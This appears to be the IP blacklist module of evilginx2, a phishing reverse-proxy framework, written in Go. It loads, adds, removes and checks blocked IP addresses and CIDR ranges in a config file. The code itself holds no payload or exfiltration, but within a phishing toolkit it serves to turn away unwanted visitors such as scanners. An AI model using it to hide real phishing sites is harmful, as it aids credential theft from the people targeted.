package core

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"

	"github.com/kgretzky/evilginx2/log"
)

type BlockIP struct {
	ipv4 net.IP
	mask *net.IPNet
}

type Blacklist struct {
	ips        map[string]*BlockIP
	masks      []*BlockIP
	configPath string
	verbose    bool
	whitelist  *Whitelist
}

func (bl *Blacklist) GetPath() string {
	return bl.configPath
}

func NewBlacklist(path string) (*Blacklist, error) {
	f, err := os.OpenFile(path, os.O_CREATE|os.O_RDONLY, 0644)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	bl := &Blacklist{
		ips:        make(map[string]*BlockIP),
		configPath: path,
		verbose:    true,
	}

	fs := bufio.NewScanner(f)
	fs.Split(bufio.ScanLines)

	for fs.Scan() {
		l := fs.Text()
		// remove comments
		if n := strings.Index(l, ";"); n > -1 {
			l = l[:n]
		}
		l = strings.Trim(l, " ")

		if len(l) > 0 {
			if strings.Contains(l, "/") {
				ipv4, mask, err := net.ParseCIDR(l)
				if err == nil {
					bl.masks = append(bl.masks, &BlockIP{ipv4: ipv4, mask: mask})
				} else {
					log.Error("blacklist: invalid ip/mask address: %s", l)
				}
			} else {
				ipv4 := net.ParseIP(l)
				if ipv4 != nil {
					bl.ips[ipv4.String()] = &BlockIP{ipv4: ipv4, mask: nil}
				} else {
					log.Error("blacklist: invalid ip address: %s", l)
				}
			}
		}
	}

	log.Info("blacklist: loaded %d ip addresses and %d ip masks", len(bl.ips), len(bl.masks))
	return bl, nil
}

func (bl *Blacklist) GetStats() (int, int) {
	return len(bl.ips), len(bl.masks)
}

func (bl *Blacklist) AddIP(ip string) error {
	if bl.IsBlacklisted(ip) {
		return nil
	}

	if strings.Contains(ip, "/") {
		ipv4, mask, err := net.ParseCIDR(ip)
		if err != nil {
			return fmt.Errorf("invalid ip/mask address: %s", ip)
		}
		bl.masks = append(bl.masks, &BlockIP{ipv4: ipv4, mask: mask})
	} else {
		ipv4 := net.ParseIP(ip)
		if ipv4 != nil {
			bl.ips[ipv4.String()] = &BlockIP{ipv4: ipv4, mask: nil}
		} else {
			return fmt.Errorf("invalid ip address: %s", ip)
		}
	}

	// write to file
	f, err := os.OpenFile(bl.configPath, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()

	_, err = f.WriteString(ip + "\n")
	if err != nil {
		return err
	}

	return nil
}

func (bl *Blacklist) IsBlacklisted(ip string) bool {
	ipv4 := net.ParseIP(ip)
	if ipv4 == nil {
		return false
	}

	if _, ok := bl.ips[ipv4.String()]; ok {
		return true
	}
	for _, m := range bl.masks {
		if m.mask != nil && m.mask.Contains(ipv4) {
			return true
		}
	}
	return false
}

func (bl *Blacklist) SetVerbose(verbose bool) {
	bl.verbose = verbose
}

func (bl *Blacklist) IsVerbose() bool {
	return bl.verbose
}

func (bl *Blacklist) IsWhitelisted(ip string) bool {
	if ip == "127.0.0.1" {
		return true
	}
	if bl.whitelist != nil {
		return bl.whitelist.IsWhitelisted(ip)
	}
	return false
}

func (bl *Blacklist) SetWhitelist(wl *Whitelist) {
	bl.whitelist = wl
}

func (bl *Blacklist) RemoveIP(ip string) error {
	ipv4 := net.ParseIP(ip)
	if ipv4 == nil {
		return fmt.Errorf("invalid ip address: %s", ip)
	}

	if !bl.IsBlacklisted(ipv4.String()) {
		return fmt.Errorf("ip address not in blacklist: %s", ip)
	}

	// remove from memory
	delete(bl.ips, ipv4.String())

	// rewrite file without this IP
	f, err := os.OpenFile(bl.configPath, os.O_RDONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()

	var lines []string
	fs := bufio.NewScanner(f)
	fs.Split(bufio.ScanLines)

	for fs.Scan() {
		l := fs.Text()
		cleanL := l
		if n := strings.Index(l, ";"); n > -1 {
			cleanL = l[:n]
		}
		cleanL = strings.Trim(cleanL, " ")

		if cleanL != ipv4.String() {
			lines = append(lines, l)
		}
	}

	// write back to file
	fw, err := os.OpenFile(bl.configPath, os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		return err
	}
	defer fw.Close()

	for _, line := range lines {
		_, err = fw.WriteString(line + "\n")
		if err != nil {
			return err
		}
	}

	return nil
}

func (bl *Blacklist) GetAllIPs() []string {
	var ips []string

	for ip := range bl.ips {
		ips = append(ips, ip)
	}

	for _, m := range bl.masks {
		if m.mask != nil {
			ips = append(ips, m.mask.String())
		}
	}

	return ips
}

func (bl *Blacklist) Clear() error {
	bl.ips = make(map[string]*BlockIP)
	bl.masks = []*BlockIP{}

	// clear file
	f, err := os.OpenFile(bl.configPath, os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		return err
	}
	defer f.Close()

	return nil
}
